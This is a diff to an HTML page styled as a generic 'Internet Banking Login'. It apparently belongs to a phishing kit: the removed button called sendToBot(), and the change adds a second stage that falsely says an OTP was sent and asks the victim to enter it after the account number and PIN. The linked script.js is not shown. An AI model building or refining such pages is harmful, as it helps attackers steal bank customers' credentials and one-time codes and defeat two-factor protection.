@@ -4,61 +4,35 @@
     <title>Secure Login</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        /* The Background */
-        body { 
-            font-family: Arial, sans-serif; 
-            background-color: #f4f4f4; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-        }
-        /* The White Card */
-        .login-card { 
-            background: white; 
-            padding: 30px; 
-            border-radius: 8px; 
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1); 
-            width: 320px; 
-            text-align: center; 
-        }
-        /* The Header */
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 320px; text-align: center; }
         h3 { color: #003366; margin-bottom: 20px; }
-        /* The Inputs */
-        input { 
-            width: 100%; 
-            padding: 12px; 
-            margin: 10px 0; 
-            border: 1px solid #ccc; 
-            border-radius: 4px; 
-            box-sizing: border-box; 
-        }
-        /* The Signature Orange Button */
-        button { 
-            width: 100%; 
-            padding: 12px; 
-            background-color: #ff6600; 
-            color: white; 
-            border: none; 
-            border-radius: 4px; 
-            font-weight: bold; 
-            cursor: pointer; 
-            margin-top: 10px;
-        }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; outline: none; }
+        /* This class makes the input turn red when empty */
+        .error-border { border: 2px solid #ff0000 !important; }
+        button { width: 100%; padding: 12px; background-color: #ff6600; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
         button:hover { background-color: #e65c00; }
+        #otp-area { display: none; margin-top: 10px; }
     </style>
 </head>
 <body>
 
     <div class="login-card">
         <h3>Internet Banking Login</h3>
-        <input type="text" id="user" placeholder="Account Number">
-        <input type="password" id="pass" placeholder="Mobile PIN">
-        <button onclick="sendToBot()">Login</button>
+        
+        <div id="login-section">
+            <input type="text" id="user" placeholder="Account Number">
+            <input type="password" id="pass" placeholder="Mobile PIN">
+            <button onclick="handleLogin()">Login</button>
+        </div>
+
+        <div id="otp-area">
+            <p style="color: #003366; font-size: 14px;">A secure code has been sent to your registered number.</p>
+            <input type="text" id="otp" placeholder="Enter 6-digit OTP" maxlength="6">
+            <button onclick="handleOtp()">Verify OTP</button>
+        </div>
     </div>
 
     <script src="script.js"></script>
-
 </body>
 </html>
